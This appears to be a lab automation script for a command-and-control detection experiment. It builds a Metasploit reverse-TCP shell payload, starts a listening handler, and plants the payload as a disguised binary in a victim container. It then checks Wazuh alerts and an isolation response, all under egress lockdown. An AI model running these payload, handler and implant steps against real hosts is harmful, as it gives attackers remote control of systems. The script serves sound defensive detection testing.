#!/usr/bin/env bash
# Threat 2 - APT / Command-and-Control: full experiment cycle.
#
#   deliver payload -> execute -> C2 channel opens -> detect -> isolate -> post-mortem
#
# Models a remote attacker who has gained a foothold and wants persistent
# control of a service host. A Metasploit reverse-TCP payload is delivered to
# a service container and run; the resulting outbound C2 channel and the
# dropped binary are detected by Wazuh, and the ssle-isolate active response
# blocks the channel, deregisters the service from the architecture, and
# snapshots the host for forensics.
#
# Victim: the analytics service. It has a single identity (clean deregister)
# and is non-critical, so isolating it does not break the sensor -> ingestion
# -> storage pipeline - which is itself part of the demonstration.
#
# SAFETY (from the C2 guide): Metasploit traffic must never leave the machine.
# The experiment runs `lab-lockdown on` so the lab cannot reach the internet,
# and everything stays on the isolated 10.255.255.0/24 network. A snapshot of
# the victim is taken first so recovery is a revert.
#
#   bash threats/c2/run-c2.sh            # full cycle
#   bash threats/c2/run-c2.sh --cleanup  # restore victim, remove attacker, unlock
set -uo pipefail

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
EV="$ROOT/evidence/c2-$(date +%Y%m%d-%H%M%S)"
ATTACKER=c2-attacker
VICTIM=analytics
WAZUH=wazuh
LPORT=4444

ip_of() { incus list "$1" -c4 -f csv | grep -oE '10\.255\.255\.[0-9]+'; }

cleanup() {
  echo "==> Cleanup"
  # Kill any running handler/payload.
  incus exec "$ATTACKER" -- systemctl stop ssle-c2-handler 2>/dev/null; incus exec "$ATTACKER" -- pkill -f msfconsole 2>/dev/null || true
  # Restore the victim from the pre-attack snapshot (removes payload, any
  # changes, and re-registers it cleanly on restart).
  if incus snapshot list "$VICTIM" -f csv 2>/dev/null | grep -q pre-c2; then
    echo "  restoring $VICTIM from snapshot pre-c2"
    incus snapshot restore "$VICTIM" pre-c2
    incus start "$VICTIM" 2>/dev/null || true
  fi
  # Clear any block left by the active response.
  incus exec "$VICTIM" -- bash -c 'nft flush table inet ssle_ar 2>/dev/null; iptables -F 2>/dev/null; true' 2>/dev/null || true
  echo "  lab-lockdown off (restore internet egress)"
  sudo lab-lockdown off 2>/dev/null || echo "  (run 'sudo lab-lockdown off' manually if egress stays blocked)"
  echo "  (attacker container $ATTACKER left in place; 'incus delete -f $ATTACKER' to remove)"
  echo "  done"
}
[[ "${1:-}" == "--cleanup" ]] && { cleanup; exit 0; }

mkdir -p "$EV"
log() { echo "$@" | tee -a "$EV/summary.txt"; }

echo "=== C2 / APT experiment  $(date -Is)" | tee "$EV/summary.txt"

# -- Preconditions --------------------------------------------------------
echo "==> Preconditions"
if ! incus exec "$ATTACKER" -- bash -c 'command -v msfvenom >/dev/null'; then
  echo "  Metasploit not installed on $ATTACKER yet. Check /root/msf-install.log." >&2
  exit 1
fi
incus exec "$VICTIM" -- systemctl is-active --quiet ssle-analytics || { echo "  victim not healthy" >&2; exit 1; }
ATT_IP=$(ip_of "$ATTACKER"); VIC_IP=$(ip_of "$VICTIM")
log "Attacker (C2): $ATTACKER = $ATT_IP"
log "Victim:        $VICTIM = $VIC_IP"

# -- Safety ---------------------------------------------------------------
echo "==> Safety: require lab egress to be locked, then snapshot the victim"
# The experiment does not hold the sudo password; lab-lockdown must already be
# on (the caller runs `sudo lab-lockdown on` first). The egress check below is
# the real safety gate regardless.
LOCK=$(sudo -n lab-lockdown status 2>/dev/null || echo "unknown")
echo "  $LOCK"
incus snapshot delete "$VICTIM" pre-c2 >/dev/null 2>&1 || true
incus snapshot create "$VICTIM" pre-c2 && log "  snapshot $VICTIM/pre-c2 taken"

# Confirm the victim really cannot reach the internet now (safety gate).
if incus exec "$VICTIM" -- timeout 4 bash -c 'echo >/dev/tcp/1.1.1.1/53' 2>/dev/null; then
  echo "  WARNING: victim still has egress; aborting for safety" >&2
  exit 1
fi
log "  confirmed: victim cannot reach the internet (lab-lockdown active)"

# -- Build the payload ----------------------------------------------------
echo "==> Attacker builds the reverse-TCP payload (msfvenom)"
incus exec "$ATTACKER" -- bash -c "
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ATT_IP LPORT=$LPORT -f elf -o /root/payload.elf 2>/dev/null
  ls -l /root/payload.elf"
log "  payload built: linux/x64/shell_reverse_tcp -> $ATT_IP:$LPORT"

# -- Start the C2 handler -------------------------------------------------
echo "==> Attacker starts the C2 handler (msfconsole, backgrounded)"
sed "s/__LHOST__/$ATT_IP/" "$ROOT/threats/c2/handler.rc" |
  incus file push -q - "$ATTACKER/root/handler.rc"
# Run the handler as a transient systemd service. Two reasons:
#  - msfconsole fed /dev/null reads EOF and exits immediately, taking the
#    handler with it; as a service it keeps a TTY-less but open stdin.
#  - a plain `incus exec ... &` does not return, because incus waits for the
#    backgrounded process's inherited descriptors to close. systemd-run
#    detaches it fully, so this call returns at once.
incus exec "$ATTACKER" -- systemctl stop ssle-c2-handler 2>/dev/null || true
incus exec "$ATTACKER" -- systemctl reset-failed ssle-c2-handler 2>/dev/null || true
# `tail -f /dev/null |` keeps msfconsole's stdin open so it does not read EOF
# and exit after running the resource script.
incus exec "$ATTACKER" -- systemd-run --unit=ssle-c2-handler --quiet --setenv=HOME=/root \
  bash -c 'tail -f /dev/null | msfconsole -q -r /root/handler.rc > /root/msf-session.log 2>&1'
echo "  handler service started"
echo "  waiting for the handler to actually LISTEN on :$LPORT..."
LISTENING=0
for _ in $(seq 1 45); do
  if incus exec "$ATTACKER" -- ss -tln 2>/dev/null | grep -q ":$LPORT "; then LISTENING=1; break; fi
  sleep 2
done
if [[ $LISTENING -eq 1 ]]; then
  echo "  handler listening on $ATT_IP:$LPORT"
else
  echo "  ERROR: handler never bound :$LPORT - aborting" >&2
  incus exec "$ATTACKER" -- tail -5 /root/msf-session.log 2>/dev/null | sed 's/^/    /' >&2
  exit 1
fi

# -- Deliver the payload to the victim ------------------------------------
# The guide allows copying the payload between containers. Dropping it into
# /opt/ssle (the service binary directory) is both a realistic implant
# location and exactly what the FIM rule watches.
echo "==> Delivering payload into the victim's /opt/ssle (triggers FIM)"
incus file pull -q "$ATTACKER/root/payload.elf" "$EV/payload.elf"
incus file push -q "$EV/payload.elf" "$VICTIM/opt/ssle/update-helper"
incus exec "$VICTIM" -- chmod +x /opt/ssle/update-helper
log "  payload delivered as /opt/ssle/update-helper on $VICTIM"
DELIVER_TS=$(date +%s)

# -- Execute the payload --------------------------------------------------
echo "==> Victim executes the payload (the foothold runs its implant)"
incus exec "$VICTIM" -- bash -c 'setsid nohup /opt/ssle/update-helper >/dev/null 2>&1 < /dev/null & echo "payload PID $!"'
log "  payload executed; C2 channel should open to $ATT_IP:$LPORT"

# -- Observe the session --------------------------------------------------
echo "==> Checking the attacker's console for a session"
for _ in $(seq 1 15); do
  incus exec "$ATTACKER" -- grep -q "Meterpreter session\|session .* opened\|Sending stage" /root/msf-session.log 2>/dev/null && break
  sleep 2
done
incus exec "$ATTACKER" -- grep -E "session .* opened|Meterpreter session|Sending stage" /root/msf-session.log 2>/dev/null | tail -2 | sed 's/^/  /' | tee -a "$EV/summary.txt"

# -- Detection ------------------------------------------------------------
echo "==> Detection (FIM on the dropped binary + outbound C2 connection)"
echo "  netwatch polls every 15s; waiting for Wazuh alerts (up to 90s)..."
FIM=0; C2=0
for _ in $(seq 1 18); do
  FIM=$(incus exec "$WAZUH" -- bash -c 'grep -hc "\"id\":\"10020[01]\"" /var/ossec/logs/alerts/alerts.json 2>/dev/null' 2>/dev/null)
  C2=$(incus exec "$WAZUH" -- bash -c 'grep -hc "\"id\":\"100213\"" /var/ossec/logs/alerts/alerts.json 2>/dev/null' 2>/dev/null)
  [[ "${FIM:-0}" -gt 0 && "${C2:-0}" -gt 0 ]] && break
  sleep 5
done
log "  Wazuh FIM alerts (100200/100201, implant file): ${FIM:-0}"
log "  Wazuh C2 alerts (100213, reverse shell to :4444): ${C2:-0}"
incus exec "$WAZUH" -- bash -c 'grep -h "\"id\":\"100213\"" /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -1' |
  python3 -c 'import json,sys
try:
    a=json.loads(sys.stdin.read()); d=a.get("data",{})
    print("    C2 alert: %s -> %s:%s (%s)" % (d.get("srcip"), d.get("dstip"), d.get("dstport"), a["rule"]["description"]))
except Exception: pass' | tee -a "$EV/summary.txt"

# -- Response -------------------------------------------------------------
echo "==> Response (ssle-isolate: block C2 + deregister + forensic snapshot)"
echo "  waiting for the active response to run (up to 60s)..."
BLOCKED=""; DEREG=""
for _ in $(seq 1 12); do
  BLOCKED=$(incus exec "$VICTIM" -- bash -c "nft list table inet ssle_ar 2>/dev/null | grep -c '$ATT_IP'" 2>/dev/null)
  DEREG=$(incus exec registry -- bash -c 'curl -s http://127.0.0.1:5050/services' | grep -c "analytics-01" 2>/dev/null)
  [[ "${BLOCKED:-0}" -gt 0 ]] && break
  sleep 5
done
if [[ "${BLOCKED:-0}" -gt 0 ]]; then
  log "  C2 address $ATT_IP BLOCKED on the victim (nftables ssle_ar)"
else
  log "  no block observed (see post-mortem)"
fi
# Is analytics still discoverable?
STILL=$(incus exec registry -- bash -c "curl -s http://127.0.0.1:5050/discover/analytics -o /dev/null -w '%{http_code}'" 2>/dev/null)
log "  registry discover(analytics) after response: HTTP $STILL (404 = isolated/deregistered)"
incus exec "$VICTIM" -- bash -c 'tail -15 /var/log/ssle/incident-response.log 2>/dev/null' > "$EV/incident-response.log" 2>/dev/null
if [[ -s "$EV/incident-response.log" ]]; then
  log "  forensic snapshot written to /var/log/ssle/incident-response.log on the victim:"
  sed 's/^/    /' "$EV/incident-response.log" | head -12 | tee -a "$EV/summary.txt"
fi

# -- Session dead? --------------------------------------------------------
echo "==> Verifying the C2 channel is severed"
sleep 5
incus exec "$VICTIM" -- bash -c "ss -tnp 2>/dev/null | grep -c ':$LPORT'" |
  xargs -I{} bash -c 'echo "  live connections to :'"$LPORT"' from victim: {}"' | tee -a "$EV/summary.txt"

# -- Post-mortem ----------------------------------------------------------
echo "==> Post-mortem" | tee -a "$EV/summary.txt"
{
  echo "Kill chain: deliver (FIM) -> execute -> C2 channel (netwatch) -> isolate."
  echo "Three independent detections: the dropped binary (FIM), the outbound"
  echo "connection to :4444 (netwatch), and - had the attacker persisted - a new"
  echo "cron/systemd unit (rootcheck)."
  echo "Response isolates rather than kills: the service is cut out of the"
  echo "architecture (deregistered, C2 blocked) but the container is left intact"
  echo "for forensics. Detection latency is bounded by the 15s netwatch poll,"
  echo "which is the window an attacker has before isolation - a real limitation."
  echo "Containment held throughout: lab-lockdown kept Metasploit traffic off the"
  echo "internet, and nftables kept the lab off the home LAN."
} | tee -a "$EV/summary.txt"

echo
echo "Evidence under: ${EV#$ROOT/}/"
echo "Run 'bash threats/c2/run-c2.sh --cleanup' to restore the victim and unlock egress."
